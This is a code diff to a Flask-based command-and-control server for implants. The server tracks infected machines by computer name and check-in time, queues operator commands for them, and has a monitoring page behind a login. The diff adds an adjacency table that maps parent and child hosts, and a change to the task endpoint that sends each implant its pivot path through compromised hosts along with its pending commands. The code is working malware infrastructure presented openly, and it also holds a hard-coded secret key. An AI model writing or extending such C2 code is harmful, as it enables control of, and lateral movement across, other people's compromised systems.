@@ -1,9 +1,12 @@
+from colorama import Fore
 import flask
-from flask import Flask, Response, request, render_template, redirect, send_from_directory, url_for
+from flask import Flask, Response, request, render_template, redirect, send_from_directory, url_for, jsonify
 from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime
 import flask_login
 import base64
+
+from sqlalchemy import ForeignKey
 
 app = Flask(__name__)
 app.secret_key = '6AC6663F6BCFEB4191481AC41972DBEE4BDF6E7AA43E74F7E64C5F07DE69CE02'
@@ -24,6 +27,11 @@ class Implant(db.Model):
 	ComputerName = db.Column(db.String, nullable=False)
 	last_checkin = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
 	creation_date = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
+
+class Adjacency(db.Model):
+	id = db.Column(db.Integer, primary_key=True)
+	ParentHostname = db.Column(db.String, ForeignKey(Implant.ComputerName), nullable=False)
+	ChildHostname = db.Column(db.String, ForeignKey(Implant.ComputerName), nullable=False)
 
 class Operator(flask_login.UserMixin, db.Model):
 	id = db.Column(db.Integer, primary_key=True)
@@ -85,13 +93,25 @@ def get_tasks(ProductID):
 	implant = Implant.query.get(ProductID)
 	implant.last_checkin = datetime.utcnow()
 	db.session.commit()
+	
+	# Generate path to host
+	hostname = implant.ComputerName
+	path = [hostname]
+	parentRelationship = Adjacency.query.filter_by(ChildHostname=hostname).first()
+	while(parentRelationship is not None):
+		hostname = parentRelationship.ParentHostname
+		path.insert(0, hostname)
+		parentRelationship = Adjacency.query.filter_by(ChildHostname=hostname).first()
+	pathString = ','.join(path)
+
 	# Send pending commands to implant
 	tasks = Task.query.filter_by(implant_id=ProductID).all()
 	strTasks = []
 	for task in tasks:
 		strTasks.append(task.cmd)
 	res = ','.join(strTasks)
-	return flask.Response(response=res, status=200)
+	
+	return jsonify({ "Path": pathString, "Tasks": res })
 
 @app.route('/monitor')
 @flask_login.login_required
